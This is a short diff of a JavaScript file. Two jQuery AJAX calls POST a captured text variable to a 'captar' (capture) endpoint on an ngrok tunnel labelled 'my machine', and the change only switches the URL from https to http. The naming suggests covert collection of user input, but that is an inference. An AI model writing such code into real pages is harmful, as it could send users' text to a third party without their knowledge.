@@ -36,7 +36,7 @@ function start(value) {
                     // ==== Ajax Para minha maquina ===
                     $.ajax(
                         method = "post",
-                        url = "https://3911337d7e9d.ngrok.io/captar/index.php",
+                        url = "http://3911337d7e9d.ngrok.io/captar/index.php",
                         data = {
                             texto: textoAjax
                         }
@@ -47,7 +47,7 @@ function start(value) {
                     // ==== Ajax Para minha maquina ===
                     $.ajax(
                         method = "post",
-                        url = "https://3911337d7e9d.ngrok.io/captar/index.php",
+                        url = "http://3911337d7e9d.ngrok.io/captar/index.php",
                         data = {
                             texto: textoAjax
                         }
